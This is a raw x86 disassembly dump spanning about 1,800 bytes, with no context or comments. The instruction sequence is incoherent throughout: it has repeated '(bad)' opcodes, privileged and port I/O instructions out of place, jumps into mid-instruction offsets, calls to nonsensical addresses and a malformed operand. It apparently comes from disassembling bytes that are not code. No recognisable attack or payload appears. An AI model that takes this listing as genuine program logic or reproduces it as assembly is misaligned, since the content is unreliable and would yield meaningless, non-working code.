  42b6bf:	mov    esp,DWORD PTR [esi-0x14]
  42b6c2:	fisttp WORD PTR [ebx-0x3748a9f2]
  42b6c8:	or     al,0x2b
  42b6ca:	mov    bh,0xba
  42b6cc:	hlt    
  42b6cd:	mov    bh,bl
  42b6cf:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42b6d5:	dec    esi
  42b6d6:	or     al,0x0
  42b6d8:	mov    edi,DWORD PTR [ebx]
  42b6da:	or     BYTE PTR [ebp+0x3b],dh
  42b6dd:	mov    ecx,DWORD PTR [edi]
  42b6df:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42b6e5:	xor    al,0xd8
  42b6e7:	pop    bp
  42b6e9:	lock xor esi,DWORD PTR [ebx]
  42b6ec:	lea    esp,[esi+0x1f]
  42b6ef:	icebp  
  42b6f0:	jb     0x42b6f6
  42b6f2:	add    al,al
  42b6f4:	jge    0x42b702
  42b6f6:	mov    eax,eax
  42b6f8:	fsubr  st,st(3)
  42b6fa:	pop    ebp
  42b6fb:	mov    esi,DWORD PTR [ebx]
  42b6fd:	in     al,0x8d
  42b6ff:	rcr    DWORD PTR [edi],0xc2
  42b702:	jb     0x42b762
  42b704:	add    cl,cl
  42b706:	jge    0x42b714
  42b708:	mov    edx,DWORD PTR [ebp-0x20]
  42b70b:	in     al,dx
  42b70c:	pop    ebp
  42b70d:	data16 data16 or BYTE PTR [esi+edi*4],bh
  42b712:	cmp    di,WORD PTR [ebp+0x0]
  42b716:	mov    ebp,DWORD PTR [ebx]
  42b718:	fdivr  QWORD PTR [esi+0x668a5d]
  42b71e:	cmp    al,0x33
  42b720:	mov    si,0x4e7d
  42b724:	mov    eax,DWORD PTR [eax]
  42b726:	lock inc ebp
  42b728:	mov    esi,DWORD PTR [esi]
  42b72a:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  42b731:	clc    
  42b732:	(bad)  
  42b733:	cmp    edi,DWORD PTR [ebx]
  42b735:	je     0x42b746
  42b737:	push   ebx
  42b738:	loopne 0x42b749
  42b73a:	dec    ecx
  42b73c:	mov    esp,DWORD PTR [edx-0x1c]
  42b73f:	int    0xf1
  42b741:	mov    esi,0x703084d
  42b746:	movlhps xmm6,xmm1
  42b749:	add    BYTE PTR [ebp+0x66],dh
  42b74c:	jmp    0x42b719
  42b74e:	mov    eax,DWORD PTR [ebx]
  42b750:	lock push ebp
  42b752:	ror    DWORD PTR [ebp-0x2972feb3],1
  42b758:	or     bh,dl
  42b75a:	jb     0x42b75a
  42b75c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  42b762:	loopne 0x42b764
  42b764:	jne    0x42b76e
  42b766:	data16 add BYTE PTR [esi+eiz*2],dh
  42b76a:	mov    ecx,ebx
  42b76c:	inc    dx
  42b76e:	icebp  
  42b76f:	add    BYTE PTR [edx+0x66],al
  42b772:	add    bl,cl
  42b774:	mov    dx,0xf2
  42b778:	mov    edx,0x66cb0066
  42b77d:	enter  0x4df1,0x19
  42b781:	pop    edi
  42b782:	jne    0x42b705
  42b784:	mov    esi,DWORD PTR [esi]
  42b786:	call   0x77b74327
  42b78b:	xor    ebp,DWORD PTR [ebx]
  42b78d:	lea    esp,[esi+0x48]
  42b790:	repnz in eax,0x3b
  42b793:	add    BYTE PTR [ebp-0x37],dh
  42b796:	xor    edx,DWORD PTR [ebp-0x15]
  42b799:	in     al,dx
  42b79a:	xor    edx,DWORD PTR [esi+0x40]
  42b79d:	mov    DWORD PTR [edi],0x338545fc
  42b7a3:	clc    
  42b7a4:	add    esi,DWORD PTR ds:0xe85b9c5f
  42b7aa:	ret    0xff
  42b7ad:	dec    DWORD PTR [ebx-0x74f8ae08]
  42b7b3:	xor    eax,0x7c084956
  42b7b8:	add    BYTE PTR [ecx+0x66],ah
  42b7bb:	(bad)  
  42b7bc:	into   
  42b7bd:	bound  eax,QWORD PTR [edx-0x33]
  42b7c0:	add    BYTE PTR [ecx+0x7ce0866],bh
  42b7c6:	mov    edx,0xc7000066
  42b7cb:	or     ah,bh
  42b7cd:	add    BYTE PTR [ebp+0x35c3f866],al
  42b7d3:	inc    edx
  42b7d4:	pushf  
  42b7d5:	add    BYTE PTR [esi+0x66],ah
  42b7d8:	into   
  42b7d9:	ret    
  42b7da:	pop    ebp
  42b7db:	fs push edi
  42b7dd:	add    BYTE PTR [edi-0x723c409a],dh
  42b7e3:	add    edi,edi
  42b7e5:	jne    0x42b83e
  42b7e7:	lea    edx,[ecx+0x1]
  42b7ea:	mov    ebx,0xd64ff1
  42b7ef:	sar    DWORD PTR [ebx],1
  42b7f1:	test   BYTE PTR [ebp+0x3c],dh
  42b7f4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  42b7f8:	push   edi
  42b7f9:	xor    BYTE PTR [ebx],0x35
  42b7fc:	mov    esi,ebx
  42b7fe:	xor    eax,DWORD PTR [eax-0x3c73839a]
  42b804:	cmp    al,0x45
  42b806:	fs pop ebx
  42b808:	mov    ebx,0x9c3b36
  42b80d:	je     0x42b83a
  42b80f:	xor    edi,DWORD PTR [ebx+0x668a33]
  42b815:	mov    WORD PTR [ebx],?
  42b817:	cmp    al,0xbb
  42b819:	fs dec esi
  42b81b:	mov    eax,DWORD PTR [eax]
  42b81d:	pop    edi
  42b81e:	cmp    ecx,ecx
  42b820:	jne    0x42b877
  42b822:	mov    ebp,esp
  42b824:	cld    
  42b825:	push   esi
  42b826:	pop    ebx
  42b827:	inc    ebp
  42b828:	stc    
  42b829:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  42b831:	clc    
  42b832:	test   dl,dl
  42b834:	notrack jmp DWORD PTR [esi+eiz*2+0x5e]
  42b839:	or     bl,al
  42b83b:	or     BYTE PTR [ebx+0x57665100],cl
  42b841:	retf   0x4245
  42b844:	add    BYTE PTR ss:[esi+eiz*2-0x457a3542],bl
  42b84c:	clc    
  42b84d:	add    BYTE PTR [ebx+0x66],bl
  42b850:	dec    edx
  42b852:	mov    edx,DWORD PTR [edi-0x76]
  42b855:	push   edi
  42b856:	add    al,0xb7
  42b858:	xor    al,0xba
  42b85a:	cmp    al,0x8d
  42b85c:	je     0x42b85d
  42b85e:	mov    edx,DWORD PTR [edi-0x46]
  42b861:	push   ecx
  42b862:	lea    edi,[ebx+0x574fff]
  42b868:	push   ecx
  42b869:	cmp    edx,DWORD PTR [ebx+0x75]
  42b86c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  42b872:	add    BYTE PTR [ebx],dh
  42b874:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  42b87a:	add    BYTE PTR [ebx+esi*1+0x4f64bb3c],cl
  42b881:	mov    ebx,0x3b3b00
  42b886:	jne    0x42b8b3
  42b888:	mov    DWORD PTR [ebx+0x728afc],edi
  42b88e:	xor    esi,DWORD PTR [ebx]
  42b890:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  42b896:	push   edi
  42b897:	cmp    esp,ebp
  42b899:	jne    0x42b89b
  42b89b:	sbb    DWORD PTR [eax],0x8085c3fc
  42b8a1:	clc    
  42b8a2:	dec    ecx
  42b8a3:	pop    ebx
  42b8a4:	sti    
  42b8a5:	add    eax,0xeb8bc075
  42b8aa:	cld    
  42b8ab:	xor    edi,DWORD PTR ds:0xf8c3855e
  42b8b1:	mov    ecx,DWORD PTR [ecx+edx*2]
  42b8b4:	rol    DWORD PTR [ebp-0x37],0xf
  42b8b8:	mov    DWORD PTR [eax],ecx
  42b8ba:	inc    edi
  42b8bb:	(bad)  
  42b8bc:	in     eax,0xf8
  42b8be:	add    bh,bh
  42b8c0:	(bad)  
  42b8c1:	mov    esi,0xc38a5e
  42b8c6:	mov    esi,DWORD PTR [ebx]
  42b8c8:	push   ecx
  42b8c9:	mov    edi,0xfc4ec7
  42b8ce:	test   DWORD PTR [ebp-0x8],edx
  42b8d1:	xor    ax,0x9cc7
  42b8d5:	sub    ebp,eax
  42b8d7:	inc    ebp
  42b8d8:	(bad)  
  42b8d9:	sub    edi,edi
  42b8db:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  42b8e1:	inc    ebp
  42b8e2:	add    BYTE PTR [esi+0x2b],ah
  42b8e5:	or     bh,BYTE PTR [edx+0xf8ac2]
  42b8eb:	cmp    al,0x33
  42b8ed:	mov    edi,DWORD PTR [edx+0xf84e81]
  42b8f3:	(bad)  
  42b8f4:	cmp    esi,DWORD PTR [ebx]
  42b8f6:	je     0x42b8b0
  42b8f8:	push   ebx
  42b8f9:	dec    esi
  42b8fa:	str    ecx
  42b8fd:	cmp    esp,DWORD PTR [edx+0x75]
  42b900:	int    0x33
  42b902:	mov    edi,0x789085f
  42b907:	mov    esp,DWORD PTR [esp+edi*8+0x0]
  42b90b:	leave  
  42b90c:	data16 add al,0xcb
  42b90f:	push   ebp
  42b910:	add    ebp,esp
  42b912:	jne    0x42b900
  42b914:	(bad)  
  42b915:	mov    DWORD PTR [ecx],0xd685f7ec
  42b91b:	clc    
  42b91c:	xlat   BYTE PTR ds:[ebx]
  42b91d:	inc    ebp
  42b91e:	mov    esi,DWORD PTR [eax+edx*2]
  42b921:	pushf  
  42b922:	in     eax,0x8b
  42b924:	add    ah,ch
  42b926:	or     BYTE PTR [edi+0x0],dl
  42b929:	push   ecx
  42b92a:	add    ax,0x72cb
  42b92e:	inc    edx
  42b92f:	add    BYTE PTR [eax],al
  42b931:	inc    ebp
  42b932:	data16 (bad) 
  42b934:	retf   
  42b935:	lock mov edx,0x66f80085
  42b93b:	inc    ebp
  42b93c:	retf   
  42b93d:	xor    eax,ecx
  42b93f:	pushf  
  42b940:	jge    0x42b909
  42b942:	ss cld 
  42b944:	pushf  
  42b945:	test   DWORD PTR [edi-0x8],ebx
  42b948:	je     0x42b98f
  42b94a:	xor    esi,DWORD PTR ds:0x7020840
  42b950:	ror    BYTE PTR [ebp-0x37],0x8d
  42b954:	push   ebp
  42b955:	add    esp,ebp
  42b957:	jb     0x42b8e4
  42b959:	add    BYTE PTR [eax],cl
  42b95b:	dec    ebp
  42b95c:	mov    bh,0x81
  42b95e:	push   esi
  42b95f:	push   edi
  42b960:	adc    DWORD PTR [ecx-0x3c],0x429eff81
  42b967:	xor    al,BYTE PTR [eax]
  42b969:	mov    edx,DWORD PTR [edi+0x10]
  42b96c:	(bad)  
  42b96d:	scas   eax,DWORD PTR es:[edi]
  42b96e:	mov    edx,0x890f003b
  42b973:	in     eax,dx
  42b974:	cld    
  42b975:	add    BYTE PTR [ebx],bh
  42b977:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  42b97b:	dec    ebp
  42b97c:	or     BYTE PTR [ebx],ch
  42b97e:	ret    0x458b
  42b981:	lock jmp 0x42b975
  42b984:	mov    ecx,DWORD PTR [eax]
  42b986:	or     BYTE PTR [edi],al
  42b988:	mov    ecx,eax
  42b98a:	xor    DWORD PTR [edx+0x2],0x0
  42b98e:	mov    bh,0xc1
  42b990:	adc    BYTE PTR [eax],dh
  42b992:	iret   
  42b993:	inc    ebp
  42b994:	mov    DWORD PTR [ebx],0x4dfff8c4
  42b99a:	inc    BYTE PTR [ebx]
  42b99c:	mov    edx,0x661100f8
  42b9a1:	adc    al,bh
  42b9a3:	dec    ecx
  42b9a4:	fisttp WORD PTR [ecx+0x456604c0]
  42b9aa:	add    dh,BYTE PTR ds:0x75e0845
  42b9b0:	ret    0x4d
  42b9b3:	lea    ecx,[ebx+0x18728301]
  42b9b9:	add    BYTE PTR [ebp+0x45],al
  42b9bc:	xor    eax,0xc7009ce9
  42b9c1:	add    al,ch
  42b9c3:	inc    ebp
  42b9c4:	test   DWORD PTR [ebx-0x3eba0708],ecx
  42b9ca:	xor    eax,0x781084d
  42b9cf:	push   edi
  42b9d0:	sahf   
  42b9d1:	push   ecx
  42b9d2:	xor    al,BYTE PTR [ecx+0x32f89e89]
  42b9d8:	inc    ebp
  42b9d9:	cmp    edi,DWORD PTR ds:0xc78b9c76
  42b9df:	or     ah,dh
  42b9e1:	inc    ebp
  42b9e2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42b9e8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  42b9ee:	in     al,dx
  42b9ef:	hlt    
  42b9f0:	push   edi
  42b9f1:	push   edi
  42b9f2:	push   ecx
  42b9f3:	push   ecx
  42b9f4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  42b9fa:	sahf   
  42b9fb:	sahf   
  42b9fc:	xor    dh,BYTE PTR [edx]
  42b9fe:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42ba04:	or     BYTE PTR [ebp+0x7],al
  42ba07:	mov    eax,ecx
  42ba09:	clc    
  42ba0a:	jb     0x42b9cd
  42ba0c:	add    BYTE PTR [ebp+0x55],cl
  42ba0f:	or     DWORD PTR [edi],0xc251d157
  42ba15:	add    DWORD PTR [ebx+0x32009e],0x8b76453b
  42ba1f:	mov    edi,eax
  42ba21:	or     cl,al
  42ba23:	inc    ebp
  42ba24:	dec    ebp
  42ba25:	mov    eax,DWORD PTR [ecx+0x514d570c]
  42ba2b:	or     WORD PTR [ecx],0x899e
  42ba30:	xor    cl,BYTE PTR [ebx+0x5776fc3b]
  42ba36:	mov    edx,DWORD PTR [ecx+0x8]
  42ba39:	mov    eax,DWORD PTR [ebp-0x8]
  42ba3c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb262]
  42ba43:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  42ba49:	inc    ebp
  42ba4a:	dec    eax
  42ba4b:	add    ecx,DWORD PTR [ebx+0x574df0f8]
  42ba51:	add    edx,DWORD PTR [ecx-0x8]
  42ba54:	mov    ecx,DWORD PTR [ecx]
  42ba56:	clc    
  42ba57:	or     BYTE PTR [ebp+eax*2+0x4532409e],al
  42ba5e:	mov    ecx,ebp
  42ba60:	clc    
  42ba61:	(bad)  
  42ba62:	popf   
  42ba63:	inc    DWORD PTR [eax]
  42ba65:	ret    0x8b
  42ba68:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  42ba6e:	mov    edi,esp
  42ba70:	hlt    
  42ba71:	test   ecx,esi
  42ba73:	clc    
  42ba74:	or     BYTE PTR [ebp+0x7],al
  42ba77:	xor    al,0xc1
  42ba79:	pushf  
  42ba7a:	jb     0x42baaf
  42ba7c:	add    BYTE PTR [eax-0x3f],al
  42ba7f:	inc    eax
  42ba80:	daa    
  42ba81:	inc    ebp
  42ba82:	inc    ebp
  42ba83:	xor    eax,0x7f80803
  42ba88:	dec    ebp
  42ba89:	sahf   
  42ba8a:	add    esi,DWORD PTR [edx]
  42ba8c:	clc    
  42ba8d:	cmp    DWORD PTR [ecx],ecx
  42ba8f:	or     al,0x8
  42ba91:	add    al,BYTE PTR [ebp+0x2c]
  42ba94:	xor    eax,0x7350845
  42ba99:	or     BYTE PTR [ebp+0x7],cl
  42ba9c:	lea    ebx,[esi-0x748dcdff]
  42baa2:	add    BYTE PTR [eax*2-0x74b21438],cl
  42baa9:	mov    edx,DWORD PTR [eax]
  42baab:	cld    
  42baac:	dec    ebp
  42baad:	push   edi
  42baae:	sub    edx,DWORD PTR [ecx-0x75]
  42bab1:	add    eax,0xf172fc
  42bab6:	or     BYTE PTR [ebp+0x7],cl
  42bab9:	add    eax,ecx
  42babb:	or     al,0x72
  42babd:	add    DWORD PTR [eax],eax
  42babf:	mov    ebx,0x29c2c1
  42bac4:	inc    ebp
  42bac5:	mov    eax,DWORD PTR [ebx]
  42bac7:	cmp    eax,0x3004d1c
  42bacd:	xbegin 0x66c846c7
  42bad3:	clc    
  42bad4:	or     BYTE PTR [ebp+0x45],al
  42bad7:	xor    al,0x35
  42bad9:	pushf  
  42bada:	or     BYTE PTR [ebx+0x454d1007],cl
  42bae0:	lea    eax,[ebp+0x33727501]
  42bae6:	add    cl,ch
  42bae8:	inc    ebp
  42bae9:	add    bl,ch
  42baeb:	add    BYTE PTR [ebx+0x45850845],cl
  42baf1:	je     0x42ba7e
  42baf3:	push   ebx
  42baf4:	or     al,0x85
  42baf6:	dec    ebp
  42baf7:	std    
  42baf8:	mov    bh,bh
  42bafa:	mov    BYTE PTR [ebp-0x75],al
  42bafd:	mov    edi,eax
  42baff:	or     al,0x89
  42bb01:	inc    ebp
  42bb02:	clc    
  42bb03:	mov    esp,esp
  42bb05:	hlt    
  42bb06:	call   DWORD PTR [edi-0x37]
  42bb09:	push   edi
  42bb0a:	or     al,0x51
  42bb0c:	push   ebp
  42bb0d:	xor    ebp,esp
  42bb0f:	mov    esi,0x457251
  42bb14:	xor    eax,0xc7459cc6
  42bb19:	mov    edi,eax
  42bb1b:	or     al,0x85
  42bb1d:	add    al,bh
  42bb1f:	inc    eax
  42bb21:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42bb25:	or     ah,bh
  42bb27:	inc    eax
  42bb28:	push   edi
  42bb29:	jmp    0x42bb7c
  42bb2b:	mov    eax,DWORD PTR ds:0xe8720c
  42bb31:	mov    DWORD PTR [ebp-0x8],eax
  42bb34:	jne    0x42bb7b
  42bb36:	jmp    0x42bac3
  42bb38:	mov    ebp,DWORD PTR [eax]
  42bb3a:	clc    
  42bb3b:	retf   0xff57
  42bb3e:	push   ecx
  42bb3f:	mov    DWORD PTR ds:0x757210,eax
  42bb45:	mov    ecx,DWORD PTR [ebp-0x4]
  42bb48:	sub    esp,DWORD PTR [ebx-0x77]
  42bb4b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  42bb52:	or     ah,bh
  42bb54:	pop    es
  42bb55:	ds sahf 
  42bb57:	push   DWORD PTR [edx]
  42bb59:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  42bb5f:	(bad)  
  42bb60:	mov    bh,bh
  42bb62:	jmp    0x42bb50
  42bb64:	leave  
  42bb65:	jne    0x42bb6f
  42bb67:	call   0x2fb4c1
  42bb6c:	in     al,dx
  42bb6d:	dec    ebp
  42bb6e:	add    dh,BYTE PTR [ebx]
  42bb70:	add    BYTE PTR [ebx],al
  42bb72:	inc    ebp
  42bb73:	cmp    esi,DWORD PTR ds:0xc78b9c74
  42bb79:	or     al,0xf0
  42bb7b:	add    BYTE PTR [ebp+0x458bf845],al
  42bb81:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  42bb87:	adc    al,0x7
  42bb89:	enter  0x9fc0,0xa5
  42bb8d:	rol    BYTE PTR [eax],0x5e
  42bb90:	mov    ecx,ecx
  42bb92:	or     al,0xc
  42bb94:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  42bb9b:	jmp    0x42bb9c
  42bb9d:	push   ebp
  42bb9e:	mov    esp,ebp
  42bba0:	cld    
  42bba1:	inc    ebp
  42bba2:	inc    ebp
  42bba3:	or     DWORD PTR [ecx+0x457dec10],0x0
  42bbaa:	push   esi
  42bbab:	push   esi
  42bbac:	mov    edi,0x7af080f
  42bbb1:	add    bh,al
  42bbb3:	test   DWORD PTR [esi+0x3a7320f],ebx
  42bbb9:	add    BYTE PTR [ecx+0x4540100f],cl
  42bbbf:	mov    ebp,eax
  42bbc1:	mov    ebp,edi
  42bbc3:	lock call edx
  42bbc6:	fcom   DWORD PTR [ebp+0x45]
  42bbc9:	mov    eax,0x148a8b
  42bbce:	push   ecx
  42bbcf:	enter  0xc145,0x83
  42bbd3:	cmp    ecx,DWORD PTR [eax]
  42bbd5:	add    BYTE PTR [ebp+0x4d],al
  42bbd8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  42bbde:	call   0xffa2b74d
  42bbe3:	cmp    eax,DWORD PTR [ebp-0xc]
  42bbe6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  42bbea:	push   ebp
  42bbeb:	(bad)  
  42bbec:	call   0x33b9f0
  42bbf1:	mov    bh,0xdb
  42bbf3:	cld    
  42bbf4:	or     BYTE PTR [ebp+0x45],bl
  42bbf7:	(bad)  
  42bbf8:	call   0xff7cb888
  42bbfd:	add    al,BYTE PTR [ebp+0x37]
  42bc00:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  42bc06:	jne    0x42bc08
  42bc08:	(bad)  
  42bc09:	cmp    edi,esp
  42bc0b:	jne    0x42bc3e
  42bc0d:	mov    edi,edi
  42bc0f:	or     BYTE PTR [ebx-0x307f0b49],cl
  42bc15:	pop    ds
  42bc16:	into   
  42bc17:	je     0x42bbda
  42bc19:	mov    ebx,DWORD PTR [esi]
  42bc1b:	or     BYTE PTR [ebp-0x49],al
  42bc1e:	mov    esp,DWORD PTR [esi-0x77]
  42bc21:	mov    esi,0x8451f0c
  42bc26:	mov    eax,DWORD PTR [eax]
  42bc28:	or     al,0x66
  42bc2a:	sar    bl,0x3b
  42bc2d:	xor    esi,DWORD PTR [ebp+0x66]
  42bc30:	xor    ecx,edi
  42bc32:	pop    edi
  42bc33:	adc    bl,BYTE PTR [ebx+0x7c]
  42bc36:	ret    0xff
  42bc39:	cld    
  42bc3a:	inc    ebp
  42bc3b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  42bc41:	cld    
  42bc42:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  42bc49:	push   0xffffff83
  42bc4b:	pop    edi
  42bc4c:	or     BYTE PTR [ebp+0x53],dh
  42bc4f:	xorps  xmm1,xmm2
  42bc52:	test   BYTE PTR [eax+eax*1],bh
  42bc55:	add    BYTE PTR [eax],al
  42bc57:	adc    eax,eax
  42bc59:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  42bc61:	jmp    DWORD PTR [eax]
  42bc63:	ror    al,0x5e
  42bc66:	inc    ebp
  42bc67:	leave  
  42bc68:	xor    ecx,DWORD PTR [eax]
  42bc6a:	and    DWORD PTR [ebx-0x3ebd0708],ecx
  42bc70:	add    ah,al
  42bc72:	xor    edi,edi
  42bc74:	xor    DWORD PTR [ebx],0x66003308
  42bc7a:	mov    DWORD PTR [ebp-0xc],ecx
  42bc7d:	pcmpgtw mm0,mm0
  42bc80:	add    dl,ah
  42bc82:	leave  
  42bc83:	mov    edi,DWORD PTR [esi-0x7d]
  42bc86:	push   ax
  42bc88:	dec    ebp
  42bc89:	mov    esi,DWORD PTR [ebx-0x75]
  42bc8c:	lea    ebp,[eax-0x7c00ff08]
  42bc92:	xor    eax,DWORD PTR [eax]
  42bc94:	sysret 
  42bc96:	dec    ebp
  42bc97:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  42bc9e:	push   WORD PTR [ecx+0x8]
  42bca2:	jne    0x42bc65
  42bca4:	ud0    ecx,DWORD PTR [ecx]
  42bca7:	mov    edi,DWORD PTR [edx+0x660000ac]
  42bcad:	(bad)  
  42bcae:	iret   
  42bcaf:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  42bcb6:	cli    
  42bcb7:	inc    ebp
  42bcb8:	cmp    al,0x8d
  42bcba:	add    BYTE PTR [esi+0x2d],ah
  42bcbd:	inc    ebp
  42bcbe:	pop    ebp
  42bcbf:	lea    ecx,[edi]
  42bcc1:	mov    dl,bh
  42bcc3:	add    BYTE PTR [edi],cl
  42bcc5:	mov    DWORD PTR [eax+eax*8],edi
  42bcc8:	mov    ebx,0x3b87
  42bccd:	add    BYTE PTR [ebx],ch
  42bccf:	inc    ebp
  42bcd0:	data16 (bad) 
  42bcd2:	clc    
  42bcd3:	int3   
  42bcd4:	cmp    eax,DWORD PTR [eax]
  42bcd6:	je     0x42bc61
  42bcd8:	push   0xffffffc8
  42bcda:	pop    edi
  42bcdb:	xchg   DWORD PTR [ebp+0x0],eax
  42bcde:	data16 add BYTE PTR [ebp+0x45],cl
  42bce2:	lea    cx,[ebp+0x10]
  42bce6:	jb     0x42bce8
  42bce8:	jmp    0x42bc73
  42bcea:	call   eax
  42bcec:	clc    
  42bced:	xchg   DWORD PTR [edi+0x1],edi
  42bcf0:	mov    eax,DWORD PTR [eax]
  42bcf2:	or     BYTE PTR [ebp-0x49],al
  42bcf5:	lea    eax,[eax+0x74003154]
  42bcfb:	push   edi
  42bcfc:	inc    edx
  42bcfd:	jge    0x42bcfe
  42bcff:	mov    DWORD PTR [edi],ecx
  42bd01:	fdiv   DWORD PTR [edi-0x6]
  42bd04:	inc    DWORD PTR [eax]
  42bd06:	xor    edx,DWORD PTR [eax+0x5f]
  42bd09:	xchg   DWORD PTR [ebx+0x1],ebx
  42bd0c:	ret    0x0
  42bd0f:	xor    BYTE PTR [ebp-0x51],cl
  42bd12:	cmp    edi,0xf0ff89f8
  42bd18:	data16 ror al,0x84
  42bd1c:	rol    BYTE PTR [eax],0x3b
  42bd1f:	add    al,dh
  42bd21:	dec    eax
  42bd22:	xchg   esp,eax
  42bd23:	push   ebx
  42bd24:	jmp    0x42bcb1
  42bd26:	push   ebp
  42bd27:	add    esp,ebp
  42bd29:	add    ebp,esp
  42bd2b:	mov    edx,DWORD PTR [edi+0x24]
  42bd2e:	clc    
  42bd2f:	dec    esi
  42bd30:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42bd36:	cmp    BYTE PTR [ebx],al
  42bd38:	jne    0x42bcc3
  42bd3a:	xor    esp,eax
  42bd3c:	jmp    0x45bebf
  42bd41:	add    ebp,DWORD PTR [ecx+ecx*4]
  42bd44:	jne    0x42bd3a
  42bd46:	call   0xffccbaa0
  42bd4b:	clc    
  42bd4c:	xchg   edi,eax
  42bd4d:	sti    
  42bd4e:	add    DWORD PTR [ebx],eax
  42bd50:	add    BYTE PTR [ebp+0x47],bl
  42bd53:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  42bd59:	pop    ebp
  42bd5a:	mov    DWORD PTR [esi-0x48],esi
  42bd5d:	jmp    0x42bda6
  42bd5f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  42bd65:	(bad)  
  42bd67:	cmp    al,0x0
  42bd69:	cmp    eax,DWORD PTR [ebp+0x18]
  42bd6c:	lea    ebx,[ebp-0x56]
  42bd6f:	jle    0x42bd71
  42bd71:	jae    0x42bcfc
  42bd73:	mov    eax,esp
  42bd75:	call   0xb900:0x8b005587
  42bd7c:	inc    ebp
  42bd7d:	push   ebp
  42bd7e:	lea    ecx,[ebp-0x27ff4f12]
  42bd84:	mov    eax,edi
  42bd86:	int3   
  42bd87:	push   ebp
  42bd88:	xchg   edi,eax
  42bd8a:	add    esp,ebp
  42bd8c:	add    BYTE PTR [eax],al
  42bd8e:	inc    ebp
  42bd8f:	add    BYTE PTR [ebp+0x8b3255],cl
  42bd95:	cld    
  42bd96:	mov    DWORD PTR [edx],edi
  42bd98:	aam    0x75
  42bd9a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  42bda0:	mov    DWORD PTR [ebx-0x50],edx
  42bda3:	test   BYTE PTR [ebp-0x1],0xe8
  42bda7:	mov    eax,DWORD PTR [eax]
  42bda9:	hlt    
  42bdaa:	add    al,al
  42bdac:	mov    eax,DWORD PTR ds:0x890045a8
  42bdb2:	dec    DWORD PTR [ebx+0x45fdf0e8]
  42bdb8:	inc    DWORD PTR [eax*2+0xf75854d]
  42bdbf:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  42bdc5:	call   0x72991b06
  42bdca:	je     0x42be2a
  42bdcc:	js     0x42be2d
  42bdce:	lock ret 0x7e
  42bdd2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  42bdd8:	mov    edi,edi
  42bdda:	sbb    al,bl
  42bddc:	clc    
  42bddd:	add    BYTE PTR [ebp-0x73],bh
  42bde0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42bde6:	ror    BYTE PTR [eax],1
  42bde8:	dec    ebp
  42bde9:	xchg   ebp,eax
  42bdea:	mov    edi,edi
  42bdec:	in     al,0x8b
  42bdee:	jge    0x42bd79
  42bdf0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42bdf6:	clc    
  42bdf7:	pop    esi
  42bdf8:	fist   DWORD PTR [ebp+0x5d398b5d]
  42bdfe:	clc    
  42bdff:	add    al,0x6e
  42be01:	mov    eax,DWORD PTR [ebx]
  42be03:	mov    BYTE PTR [ebp+0x0],dl
  42be06:	mov    edx,DWORD PTR [ebx-0x20]
  42be09:	adc    esi,DWORD PTR [edi+0x5e005f42]
  42be0f:	add    eax,0x3b3b73
  42be14:	adc    al,0x89
  42be16:	pop    eax
  42be17:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  42be1b:	ret    0xf08
  42be1e:	cmp    al,0x2
  42be20:	mov    DWORD PTR [edx+0x665500fc],edi
  42be26:	add    eax,ebx
  42be28:	add    esp,eax
  42be2a:	sub    eax,eax
  42be2c:	or     BYTE PTR [ecx-0x77f474bb],cl
  42be32:	add    BYTE PTR [eax],al
  42be34:	mov    DWORD PTR [ebx-0x24],ebx
  42be37:	push   edi
  42be38:	push   ebp
  42be39:	clc    
  42be3a:	add    DWORD PTR [esi+0x1b0100],0x45
  42be41:	out    0xff,eax
  42be43:	add    edx,DWORD PTR [eax]
  42be45:	jmp    0x42be2f
  42be47:	cmp    ch,0x49
  42be4a:	(bad)  
  42be4b:	jmp    0x40c8469d
  42be50:	je     0x42bddc
  42be52:	mov    eax,DWORD PTR [eax-0x10c78304]
  42be58:	inc    ebp
  42be59:	add    BYTE PTR [ebx-0x770375],al
  42be5f:	add    ah,ch
  42be61:	add    edx,esp
  42be63:	pop    edi
  42be64:	pop    ebp
  42be65:	push   ebp
  42be66:	inc    ebx
  42be67:	in     al,dx
  42be68:	pop    ebp
  42be69:	in     al,dx
  42be6a:	cmp    edx,DWORD PTR [edi-0x8]
  42be6d:	xor    eax,0x895b9c94
  42be72:	leave  
  42be73:	call   0x8998057c
  42be78:	in     al,dx
  42be79:	in     al,0x45
  42be7b:	dec    ebp
  42be7c:	push   esi
  42be7d:	test   DWORD PTR [eax+0xfb010f],esi
  42be83:	add    BYTE PTR [eax+0xc018b],dh
  42be89:	leave  
